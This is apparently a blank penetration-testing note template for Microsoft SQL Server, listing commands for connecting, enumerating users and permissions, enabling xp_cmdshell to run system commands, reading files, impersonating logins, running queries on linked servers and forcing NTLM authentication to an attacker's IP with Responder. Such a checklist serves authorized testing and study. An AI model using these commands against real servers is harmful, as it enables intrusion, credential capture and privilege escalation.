Template Version: 2025.10.20
### Versions:
- [ ] 
##### Exploit Search:

##### Findings:

---
### Commands:
###### Connection:
- Impacket: `impacket-mssqlclient -port <PORT> <DOMAIN>/<USER>:<PASS>@<IP> [-windows-auth]`
- Windows: `sqlcmd -S <server>\<instance> -U <user> -P <pwd> -d <DB> -Q "<query>"`
###### Version check:
- `select @@version;`
###### Enable and run `xp_cmdshell`:
```sql
exec sp_configure 'show advanced options', '1';
reconfigure;
exec sp_configure 'xp_cmdshell', '1';
reconfigure;
exec xp_cmdshell '<cmd>';
```
###### File read via Distributed Data Access:
```sql
exec sp_configure 'show advanced options', '1';
reconfigure;
exec sp_configure 'ad hoc distributed queries', '1';
reconfigure;
select * from openrowset(bulk, '<path\to\file>', single_clob) as x;
```
###### Retrieve domain info and SIDs:
Domain info:
- `select default_domain();`
SQL:
- `select suser_sid('<domain>\<user/group>');`
- `select master.sys.fn_varbintohexstr(suser_sid('<domain>\<user/group>'));`
Python:
```python
hexs = "<hex>"
hexs = "".join(c for c in hexs if c.lower() in "0123456789abcdef")
b = bytes.fromhex(hexs)
rev = b[0]
subc = b[1]
ident = int.from_bytes(b[2:8], 'big')
subs = [str(int.from_bytes(b[8 + 4*i : 12 + 4*i], 'little')) for i in range(subc)]
sid = f"S-{rev}-{ident}" + ''.join('-' + s for s in subs)
print(sid)
```

---
### Users and Roles:
###### Users and logins (run per user):
- `enum_users` (Impacket)
- `enum_logins` (Impacket)
- `select name,type_desc,default_schema_name,create_date from sys.database_principals where type in ('S', 'U', 'G', 'R');`
###### Sysadmins (run per user):
- `SELECT r.name AS role, m.name AS member FROM sys.server_principals r JOIN sys.server_role_members rm ON r.principal_id = rm.role_principal_id JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id WHERE r.name = 'sysadmin';`

---
### Authenticated Enumeration:
###### Current User:
- `select user_name();`
- `select suser_name();`
###### Server and DB permissions:
- `select * from fn_my_permissions(null, 'SERVER');`
- `select * from fn_my_permissions(null, 'DATABASE');`
###### Server roles:
- `SELECT sp.name AS role_name FROM sys.server_role_members srm JOIN sys.server_principals sp ON srm.role_principal_id = sp.principal_id WHERE srm.member_principal_id = (SELECT principal_id FROM sys.server_principals WHERE name = SUSER_NAME());`
###### Impersonation:
- Check: `select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'IMPERSONATE';`
- Execute: `execute as login='<user>'; <query>;`
###### Linked Servers:
- Check: `exec sp_linkedservers;`
- Execute: `exec('<query>') at [<host>];`
###### DB Enumeration:
- Show databases: `select name from sys.databases;` (default: `master`, `tempdb`, `model`, `msdb`)
- Show tables: `select * from <db>.information_schema.tables;`
- Select from table: `select * from <db>.dbo.<table>;`
###### NTLM Forced Authentication:
- Responder: `sudo responder -I tun0`
- SQL: `exec xp_dirtree '\\<IP>\Share'`

---
### User:








---
- [ ] Exploit search